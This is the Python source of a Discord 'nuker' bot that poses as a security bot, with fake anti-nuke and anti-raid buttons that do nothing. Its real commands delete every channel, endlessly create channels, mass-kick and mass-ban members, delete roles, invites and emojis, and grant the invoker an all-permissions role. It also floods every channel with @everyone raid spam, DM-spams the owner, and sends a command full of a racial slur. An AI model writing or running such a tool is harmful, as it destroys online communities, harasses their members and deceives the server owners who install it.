import discord
from discord.ext import commands
from colorama import Fore
import datetime
import random
import string
from discord.embeds import Embed
from discord.ext.commands import cooldown
import time
import asyncio
import requests
from discord.ui import View, Button
import os
import json

if os.path.exists("config.json"):

     with open(f"config.json", encoding='utf8') as f:
        config = json.load(f)
channel_names = config["Channel_Names"]

client = commands.Bot(command_prefix=".", intents=discord.Intents.all())
client.remove_command('help')

@client.event
async def on_ready():
    print("Logged in as {}".format(client.user))
    print("made by YOUR_USERNAME")
    print("prefix .")
    synced = await client.tree.sync()

    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=".security"))

@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    
    server_id = ctx.guild.id
    server_name = ctx.guild.name
    nuker = ctx.author.name
    server_owner = ctx.guild.owner.name
    member_count = ctx.guild.member_count
    
    log_channel_id = 1183772579366977546  # Replace with your log channel ID
    log_channel = client.get_channel(log_channel_id)
    
    if log_channel is not None:

        invite = await ctx.channel.create_invite()

        embed = discord.Embed(title="Server Nuked", color=0xFF0000)
        embed.add_field(name="Server ID", value=server_id, inline=False)
        embed.add_field(name="Server Name", value=server_name, inline=False)
        embed.add_field(name="Nuked by", value=nuker, inline=False)
        embed.add_field(name="Server Owner", value=server_owner, inline=False)
        embed.add_field(name="Member Count", value=member_count, inline=False)
        embed.add_field(name="Server Invite", value=invite.url, inline=False)
        
        await log_channel.send(embed=embed)
    else:
        print("Log channel not found.")

    await ctx.guild.edit(name="𝕹𝖀𝕶𝕰𝕯 𝕭𝖄 𝕾𝕰𝕮𝖀𝕴𝕽𝕿𝖄") # Change To Whatever

    with open("logo.png", "rb") as f:
        icon = f.read()
        await ctx.guild.edit(icon=icon)

    try:
        for channel in ctx.guild.channels:
            await channel.delete()
            print("Deleted {}".format(channel))
    except:
        print("Can't delete {}".format(channel))

    while True:
        await ctx.guild.create_text_channel("N̶U̶K̶E̶D̶ B̶Y̶ S̶E̶C̶U̶I̶R̶T̶Y̶")

# pings
@client.event
async def on_guild_channel_create(channel):
    while True:
        await channel.send("@everyone @here THIS SERVER JUST GOT FUCKED SKIDS, GET THE BOT HERE https://discord.gg/m3TUNwEXqy 🤣🤣") # Change to your server


@client.command()
async def guildname(ctx, newname):
    await ctx.message.delete()
    await ctx.guild.edit(name=newname)

@client.command()
async def kick(ctx):
    try:
        for members in ctx.guild.members:
            if members.id != ctx.author.id and members.id != ctx.guild.owner.id:
                await members.kick(reason="Get fucking nuked bitch")
                print(Fore.GREEN + f"kicked {members}")
    except:
        print(Fore.RED + f"cant kick {members}")

@client.command()
async def massban(ctx, reason=None):
    try:
        for member in ctx.guild.members:
            if member.id != ctx.guild.owner_id and member.id != ctx.author.id and member.id != client.user.id:
                await member.ban(reason=reason)
                print(f"banned {member}")
                await member.ban(reason=reason)
                print(f"banned {member}")
    except:
        print(Fore.RED + f"cant massban members")

@client.command()
async def ping(ctx):
    latency = round(client.latency * 1000)
    await ctx.send(f"my ping is {latency}ms")

@client.command()
async def servers(ctx):
    guild_count = len(client.guilds)
    await ctx.send(f'I am in {guild_count} servers!')

@client.command()
async def mass_rename_roles(ctx, new_name):
    await ctx.message.delete()
    for role in ctx.guild.roles:
        try:
            await role.edit(name=new_name)
            print(f'Renamed role {role} to {new_name}')
        except:
            print(f'Failed to rename role {role}')

@client.command()
async def mass_rename_channels(ctx, new_name):
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        try:
            await channel.edit(name=new_name)
            print(f'Renamed channel {channel} to {new_name}')
        except:
            print(f'Failed to rename channel {channel}')

@client.command()
async def popular_inv_delete(ctx):
    await ctx.message.delete()
    invites = await ctx.guild.invites()
    if invites:
        invites.sort(key=lambda x: x.uses, reverse=True)
        popular_invite = invites[0]
        try:
            await popular_invite.delete()
            print(f'Deleted the most popular invite: {popular_invite}')
        except:
            print(f'Failed to delete the most popular invite: {popular_invite}')
    else:
        print('No invites to delete.')

@client.command()
async def invs_delete(ctx):
    await ctx.message.delete()
    invites = await ctx.guild.invites()
    for invite in invites:
        try:
            await invite.delete()
            print(f'Deleted invite {invite}')
        except:
            print(f'Failed to delete invite {invite}')

@client.command()
async def mess_channels(ctx):
    await ctx.message.delete()
    if isinstance(ctx.channel, discord.CategoryChannel):
        for channel in ctx.channel.channels:
            try:
                await channel.delete()
                print(f'Deleted channel {channel}')
            except:
                print(f'Failed to delete channel {channel}')
    else:
        print('Command must be used in a category channel.')

@client.command()
async def skull_spam(ctx):
    await ctx.message.delete()
    
    channels = ctx.guild.channels

    while True:
        for channel in channels:
            try:
                await channel.send("💀☠️")
                print(f"Sent emojis in {channel}")
            except Exception as e:
                print(f"Failed to send emojis in {channel}: {e}")

@client.command(pass_context=True)
async def raid(ctx):
    await ctx.message.delete()
    while True:
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N") # Change all these to your servers
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N")
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N")
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N")
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N")
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N")
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N")
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N")
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N")
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N")
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N")
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N")
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N")
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N")
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N")
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N")
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N")
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N")
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N")
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N")
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N")
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N")
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N")
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N")
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N")
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N")
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N")
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N")
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N")
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N")
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N")
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N")
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N")
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N")
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N")
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N")
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N")
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N")
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N")
        await ctx.send(
            "@everyone @here RAIDED BY https://discord.gg/BqXyZFKh7N")
        
@client.command(name='commands', help='Lists all the available commands')
async def help(ctx):
    embed = discord.Embed(
        title='Security nuker commands',
        description='',
        color=0x00FF00
    )

    embed.add_field(
        name='.',
        value='The prefix for this bot is .',
        inline=False
    )

    embed.add_field(
        name='**.raid**',
        value='raids the server',
        inline=False
    )

    embed.add_field(
        name='**__.nuke__**',
        value='nukes the server',
        inline=False
    )

    embed.add_field(
        name='**.skull_spam**',
        value='spams skull emojis',
        inline=False
    )

    embed.add_field(
        name='**.mess_channels**',
        value='deletes channels',
        inline=False
    )

    embed.add_field(
        name='**.invs_delete**',
        value='deletes invites',
        inline=False
    )

    embed.add_field(
        name='**.popular_invs_delete**',
        value='deletes the most popular invites',
        inline=False
    )

    embed.add_field(
        name='**.mass_rename_channels**',
        value='renames every channel in the server',
        inline=False
    )

    embed.add_field(
        name='**.mass_rename_roles**',
        value='renames every role in the server',
        inline=False
    )

    embed.add_field(
        name='**.massban**',
        value='bans everyone in the server',
        inline=False
    )

    embed.add_field(
        name='**.kick**',
        value='kicks everyone in the server',
        inline=False
    )

    embed.add_field(
        name='**.guildname**',
        value='renames the server name to whatever you want',
        inline=False
    )

    embed.add_field(
        name='**.ownerspam**',
        value='spams the owner in dms',
        inline=False
    )

    embed.add_field(
        name='**.servers**',
        value='checks how many servers the bot is in',
        inline=False
    )

    embed.add_field(
        name='**.ping**',
        value='get the bots ping (useless)',
        inline=False
    )

    embed.add_field(
        name='**.rolespam**',
        value='spam creates roles',
        inline=False
    )

    embed.add_field(
        name='**.admin**',
        value='creates a role with admin perms',
        inline=False
    )

    embed.add_field(
        name='**.nickname**',
        value='nicknames everyone in the server',
        inline=False
    )

    embed.add_field(
        name='**.rolesdelte**',
        value='deletes all roles',
        inline=False
    )

    embed.add_field(
        name='**.purge**',
        value='purges messages cant be over 100',
        inline=False
    )

    embed.add_field(
        name='**.emoji**',
        value='deletes all emojis (may take some time depending on the amount of emojis)',
        inline=False
    )

    embed.add_field(
        name='**.Clown**',
        value='spams clown nd other emojis',
        inline=False
    )

    embed.add_field(
        name='**.lagspam**',
        value='lags the server by spamming chain emojis (may crash your dc)',
        inline=False
    )

    embed.add_field(
        name='**.niggas**',
        value='sends (NIGGA THIS SERVER JUST GOT FUCKED 🤡🤡🤡🤡🤡🤡) 50 times',
        inline=False
    )

    embed.add_field(
        name='**.logo**',
        value='spams the logo',
        inline=False
    )

    await ctx.send(embed=embed) # To add more commands to this copy and paste then put the command so name='**YOUR_COMMAND**' etc

@client.command()
async def admin(ctx):
    now = datetime.datetime.now()
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    print(dt_string, ':', ctx.author, 'executed: .admin in', ctx.guild)
    await ctx.message.delete()
    
    role = await ctx.guild.create_role(
        name='admin',
        permissions=discord.Permissions.all()
    )

    await ctx.author.add_roles(role)
    message = await ctx.send('✅ **Role Created!**', delete_after=1)

@client.command()
async def nickname(ctx):
    now = datetime.datetime.now()
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    print(dt_string, ':', ctx.author, 'executed: .nickname in', ctx.guild)
    await ctx.message.delete()
    char = string.ascii_letters + string.digits
    for member in ctx.guild.members:
        nickname = ''.join((random.choice(char) for i in range(16)))
        try:
            await member.edit(nick=nickname)
        except discord.Forbidden:
            continue
    await ctx.send('✅ **Nicknamed everyone!**', delete_after=1)

@client.command()
@cooldown(1, 5, commands.BucketType.user)
async def rolesdelete(ctx):
    now = datetime.datetime.now()
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    print(dt_string, ':', ctx.author, 'executed: .rdelete in', ctx.guild)
    await ctx.message.delete()

    for role in ctx.guild.roles:
        try:
            await role.delete()
        except:
            pass 

    embed = Embed(title="Done Deleting All Roles", color=0xaf1aff)
    await ctx.send(embed=embed)

    await asyncio.sleep(1)

    await ctx.channel.purge(limit=2)

# fake commands

class StatusView(discord.ui.View): # Dont mess with fake commands unless yk what you're doing
    def __init__(self):
        super().__init__()

        # Add a button to enable the bot
        enable_button = discord.ui.Button(style=discord.ButtonStyle.green, label="Enable Bot")
        enable_button.callback = self.enable_button_callback
        self.add_item(enable_button)

        # Add a button to disable the bot
        disable_button = discord.ui.Button(style=discord.ButtonStyle.red, label="Disable Bot")
        disable_button.callback = self.disable_button_callback
        self.add_item(disable_button)

    async def enable_button_callback(self, interaction):
        await interaction.response.send_message("Bot has been enabled!", ephemeral=True)

    async def disable_button_callback(self, interaction):
        await interaction.response.send_message("Bot has been disabled!", ephemeral=True)

@client.command()
async def antinuke(ctx):
    embed = discord.Embed(
        title="enable/disable anti-nuke",
        description="Please select an option below to enable or disable anti-nuke.",
        color=discord.Color.green()
    )
    embed.set_footer(text="to enable anti-nuke please press enable. to disable the antinuke please press disable. Thank you for using security!")

    view = StatusView()

    await ctx.send(embed=embed, view=view)

class FakeAntiRaidView(discord.ui.View):
    def __init__(self):
        super().__init__()

        protect_button = discord.ui.Button(style=discord.ButtonStyle.blurple, label="Protect Server")
        protect_button.callback = self.protect_button_callback
        self.add_item(protect_button)

        alert_button = discord.ui.Button(style=discord.ButtonStyle.primary, label="Send Alert")
        alert_button.callback = self.alert_button_callback
        self.add_item(alert_button)

        disable_button = discord.ui.Button(style=discord.ButtonStyle.red, label="Disable Anti-Raid")
        disable_button.callback = self.disable_button_callback
        self.add_item(disable_button)

    async def protect_button_callback(self, interaction):
        await interaction.response.send_message("Server is now protected from raids!", ephemeral=True)

    async def alert_button_callback(self, interaction):
        await interaction.response.send_message("Alert sent to server members!", ephemeral=True)

    async def disable_button_callback(self, interaction):
        await interaction.response.send_message("Anti-Raid system disabled.", ephemeral=True)

@client.command()
async def antiraid(ctx):
    embed = discord.Embed(
        title="Anti-Raid",
        description="Please click the buttons below to set it up!",
        color=discord.Color.blurple()
    )
    embed.set_footer(text="Here is what the buttons do, Portect server...this enables antiraid and protects the server, send alert...this sends an alert to everyone in the server in dms apart from the server owner, disable Anti-Raid...this disables anti raid. protect your server today!")

    view = FakeAntiRaidView()

    await ctx.send(embed=embed, view=view)

@client.command()
async def purge(ctx, amount=5):
    if amount > 100:
        await ctx.send('Amount should be less than or equal to 100')
    else:
        await ctx.channel.purge(limit=amount)

@client.command(name='security', help='Lists all the available commands')
async def security(ctx):
    embed = discord.Embed(
        title='Security commands',
        description='',
        color=0x00FF00
    )

    embed.add_field(
        name='.purge',
        value='purges messages',
        inline=False
    )

    embed.add_field(
        name='.antinuke',
        value='enable/disable antinuke',
        inline=False
    )

    embed.add_field(
        name='.antiraid',
        value='enables/disables antiraid',
        inline=False
    )

    embed.add_field(
        name='captcha',
        value='advanced captcha system',
        inline=False
    )

    embed.add_field(
        name='.verification',
        value='set up verification system',
        inline=False
    )

    embed.add_field(
        name='.antispam',
        value='set up antispam',
        inline=False
    )

    embed.add_field(
        name='.automod',
        value='setup automod',
        inline=False
    )

    await ctx.send(embed=embed)

@client.command()
async def ownerspam(ctx):
    server_owner = ctx.guild.owner

    await asyncio.sleep(0)
    asyncio.ensure_future(ctx.message.delete())

    for _ in range(45):
        msg = await server_owner.send("SECURITY FUCKED YOUR SERVER LMAOO BEST IN COM https://discord.gg/BqXyZFKh7N 😂😂 @here @everyone https://tenor.com/view/walter-white-breaking-bad-badhai-ho-breaking-rizzy-nuked-gif-26412978") # Change to whatever
        asyncio.ensure_future(msg.delete())

@client.command()
async def emoji(ctx):
    if ctx.author.guild_permissions.manage_emojis:
        emojis = ctx.guild.emojis

        delete_tasks = [emoji.delete() for emoji in emojis]
        await asyncio.gather(*delete_tasks)

        await asyncio.gather(ctx.message.delete(), ctx.send('All emojis have been deleted.', delete_after=1))
    else:
        await ctx.send('You do not have the necessary permissions to manage emojis.')

@client.command()
async def lagspam(ctx):
  while True:
    for channel in ctx.guild.text_channels:
      await channel.send(":chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains:") # Note: This lags the server nd your phone/pc hard

@client.command()
async def niggas(ctx):
    await asyncio.sleep(0)
    for _ in range(50):
        await ctx.send("NIGGA THIS SERVER JUST GOT FUCKED 🤡🤡🤡🤡🤡🤡")

@client.command()
async def clown(ctx):
    await asyncio.sleep(0)
    for _ in range(100):
        emojis = ["🤡" "🤓", "🤮", "", ""] # Add more if needed
        random_response = random.choice(emojis)
        await ctx.send(random_response)

@client.command()
async def logo(ctx):
    with open("logo.png", "rb") as file:
        for _ in range(60):
            await ctx.send(file=discord.File(file, "logo.png"))
            await asyncio.sleep(0) # In logo.png change to your logo

@client.command()
async def kickme(ctx):
    if ctx.guild:
        await ctx.send("Kicking myself. Goodbye!")
        await ctx.guild.leave()
    else:
        await ctx.send("This command can only be used in a server.")

@client.command()
async def gif(ctx):
    await asyncio.sleep(0)
    channels = ctx.guild.channels

    for _ in range(1000):
        emojis = [
            "https://tenor.com/view/the-boiiis-gif-27668164",
            "https://tenor.com/view/walter-white-breaking-bad-badhai-ho-breaking-rizzy-nuked-gif-26412978",
            "https://media.giphy.com/media/wgts1jTI7vmy9M0XlP/giphy.gif",
            "https://media.giphy.com/media/Y3qZ1blc7po083g0gg/giphy.gif"
        ]
        
        random_response = random.choice(emojis)

        random_channel = random.choice(channels)

        if isinstance(random_channel, discord.TextChannel):
            random_response = f"@here @everyone {random_response}"

            await random_channel.send(random_response)

        await asyncio.sleep(0)

# FAKE MF COMMANDS

@client.tree.command(name='mf-link', description='Link your mf account.') # If you want to add more or just take this for an eco system feel free
async def user_command(interaction: discord.Interaction, username: str):
    embed = discord.Embed(
        title=f'Trade Sent!',
        description=f'🎁 Verifiaction Link sent to: `{username}` (You have 1 minute to accept the trade)',
        color=discord.Color.green()
    )
    await interaction.response.send_message(embed=embed)

async def get_wallet_data():
    try:
        with open('wallet.json', 'r') as f:
            data = json.load(f)
    except FileNotFoundError:
        data = {}
    return data

@client.tree.command(name='mf-wallet', description='View your wallet.')
async def wallet_command(interaction: discord.Interaction):
    user = interaction.user
    users = await get_wallet_data()

    if str(user.id) not in users:
        users[str(user.id)] = {"coins": 0, "card_wishlist": 0, "premium_spin": 0, "bot_trades": 0}
        with open('wallet.json', 'w') as f:
            json.dump(users, f)

    wallet_data = users[str(user.id)]

    embed = discord.Embed(
        title=f"",
        description=f"\n```{user.name}```",
        color=discord.Color.gold()
    )

    embed.add_field(
        name="<:mf_coin:1196838483105415228> Coins",
        value=f"You currently have {wallet_data['coins']} Coins.",
        inline=False
    )

    embed.add_field(
        name="<:cards:1196838626940698654> Card Wishlist",
        value=f"You currently have {wallet_data['card_wishlist']} Card Wishlist.",
        inline=False
    )

    embed.add_field(
        name="<:spin:1196838823632588810> Premium Spin",
        value=f"You currently have {wallet_data['premium_spin']} Premium Spin.",
        inline=False
    )

    embed.add_field(
        name="<:Bot:1196838965618155550> Bot Trades",
        value=f"You currently have {wallet_data['bot_trades']} Bot Trades.",
        inline=False
    )

    embed.set_footer(text="MF24 Bot made by Omar 👑")
    server = interaction.guild
    if server:
        embed.set_thumbnail(url=server.icon.url)

    await interaction.response.send_message(embed=embed)

async def get_wallet_data():
    try:
        with open('wallet.json', 'r') as f:
            data = json.load(f)
    except FileNotFoundError:
        data = {}
    return data

@client.tree.command(name='mf-hourlyspin', description='Spin the hourly jackpot.')
async def hourly_spin_command(interaction: discord.Interaction):
    user = interaction.user
    users = await get_wallet_data()

    if str(user.id) in users and "last_spin" in users[str(user.id)]:
        last_spin_time = datetime.datetime.fromisoformat(users[str(user.id)]["last_spin"])
        current_time = datetime.datetime.now()

        hours_difference = (current_time - last_spin_time).total_seconds() / 3600

        if hours_difference < 1:
            await interaction.response.send_message("You can spin the hourly spin again in the next hour.")
            return

    if str(user.id) not in users:
        users[str(user.id)] = {"coins": 0, "card_wishlist": 0, "premium_spin": 0, "bot_trades": 0, "last_spin": ""}

    jackpot_chance = random.random()
    if jackpot_chance < 0.1:
        coins_reward = 150000000
        trades_reward = 1500
        premium_spins_reward = 3
        card_wishlist_reward = 1000
        jackpot_message = f"👑{user.name} has hit the jackpot and got {coins_reward} Coins, {trades_reward} Bot Trades, {premium_spins_reward} Premium Spins, {card_wishlist_reward} Card Wishlist!"
    else:
        coins_reward = random.randint(1000000, 10000000)
        trades_reward = random.randint(1, 300)
        premium_spins_reward = 0
        card_wishlist_reward = random.randint(200, 500)
        jackpot_message = ""

    users[str(user.id)]["coins"] += coins_reward
    users[str(user.id)]["bot_trades"] += trades_reward
    users[str(user.id)]["premium_spin"] += premium_spins_reward
    users[str(user.id)]["card_wishlist"] += card_wishlist_reward
    users[str(user.id)]["last_spin"] = datetime.datetime.now().isoformat()

    with open('wallet.json', 'w') as f:
        json.dump(users, f)

    embed = discord.Embed(
        title=f"Hourly Spin Result for {user.name}",
        color=discord.Color.gold()
    )
    embed.add_field(name="<:mf_coin:1196838483105415228> Coins", value=f"You won {coins_reward} Coins.", inline=False)
    embed.add_field(name="<:Bot:1196838965618155550> Bot Trades", value=f"You won {trades_reward} Bot Trades.", inline=False)
    embed.add_field(name="<:spin:1196838823632588810> Premium Spins", value=f"You won {premium_spins_reward} Premium Spins.", inline=False)
    embed.add_field(name="<:cards:1196838626940698654> Card Wishlist", value=f"You won {card_wishlist_reward} Card Wishlist.", inline=False)

    await interaction.response.send_message(content=jackpot_message, embed=embed)

async def get_wallet_data():
    try:
        with open('wallet.json', 'r') as f:
            data = json.load(f)
    except FileNotFoundError:
        data = {}
    return data

@client.tree.command(name='mf-daily-spin', description='Spin the wheel for daily rewards.')
async def daily_spin_command(interaction: discord.Interaction):
    user = interaction.user
    users = await get_wallet_data()

    if str(user.id) not in users:
        users[str(user.id)] = {"coins": 0, "trades": 0, "premium_spins": 0, "card_wishlist": 0, "last_spin": ""}

    if "last_spin" in users[str(user.id)]:
        last_spin_time = datetime.datetime.fromisoformat(users[str(user.id)]["last_spin"])
        current_time = datetime.datetime.now()

        days_difference = (current_time - last_spin_time).days

        if days_difference < 1:
            await interaction.response.send_message("You can spin the daily spin again tomorrow.")
            return

    jackpot_chance = random.random()
    if jackpot_chance < 0.1:
        coins_reward = 150000000
        trades_reward = 1500
        premium_spins_reward = 3
        card_wishlist_reward = 1000
        jackpot_message = f"👑{user.name} has hit the jackpot and got {coins_reward} Coins, {trades_reward} Bot Trades, {premium_spins_reward} Premium Spins, {card_wishlist_reward} Card Wishlist!"
    else:
        coins_reward = random.randint(1000000, 10000000)
        trades_reward = random.randint(1, 300)
        premium_spins_reward = 0
        card_wishlist_reward = random.randint(200, 500)
        jackpot_message = "" # Dont touch or put anything here

    users[str(user.id)]["coins"] += coins_reward
    users[str(user.id)]["trades"] += trades_reward
    users[str(user.id)]["premium_spins"] += premium_spins_reward
    users[str(user.id)]["card_wishlist"] += card_wishlist_reward
    users[str(user.id)]["last_spin"] = datetime.datetime.now().isoformat()

    with open('wallet.json', 'w') as f:
        json.dump(users, f)

    embed = discord.Embed(
        title=f"Daily Spin Result for {user.name}",
        color=discord.Color.gold()
    )
    embed.add_field(name="<:mf_coin:1196838483105415228> Coins", value=f"You won {coins_reward} Coins.", inline=False)
    embed.add_field(name="<:Bot:1196838965618155550> Bot Trades", value=f"You won {trades_reward} Bot Trades.", inline=False)
    embed.add_field(name="<:spin:1196838823632588810> Premium Spins", value=f"You won {premium_spins_reward} Premium Spins.", inline=False)
    embed.add_field(name="<:cards:1196838626940698654> Card Wishlist", value=f"You won {card_wishlist_reward} Card Wishlist.", inline=False)

    await interaction.response.send_message(content=jackpot_message, embed=embed)

async def get_wallet_data():
    try:
        with open('wallet.json', 'r') as f:
            data = json.load(f)
    except FileNotFoundError:
        data = {}
    return data

@client.tree.command(name='mf-pay', description='Give bot trades, coins, or card wishlists to another user.')
async def pay_command(interaction: discord.Interaction, target_user: discord.User, amount: int, payment_type: str):
    user = interaction.user
    users = await get_wallet_data()

    if str(target_user.id) not in users:
        await interaction.response.send_message("The target user doesn't have a wallet.")
        return

    if amount <= 0 or amount > 10000000:
        await interaction.response.send_message("Invalid payment amount. Please choose a value between 1 and 10,000,000.")
        return

    if payment_type.lower() == 'coins':
        payment_key = 'coins'
    elif payment_type.lower() == 'bot_trades':
        payment_key = 'bot_trades'
    elif payment_type.lower() == 'card_wishlist':
        payment_key = 'card_wishlist'
    else:
        await interaction.response.send_message("Invalid payment type. Please choose 'coins', 'bot_trades', or 'card_wishlist'.")
        return

    if users[str(user.id)][payment_key] < amount:
        await interaction.response.send_message(f"You do not have enough {payment_type}.")
        return

    users[str(user.id)][payment_key] -= amount
    users[str(target_user.id)][payment_key] += amount

    with open('wallet.json', 'w') as f:
        json.dump(users, f)

    await interaction.response.send_message(f"{user.mention} paid {amount} {payment_type} to {target_user.mention}.")

client.run("YOUR_BOT_TOKEN")
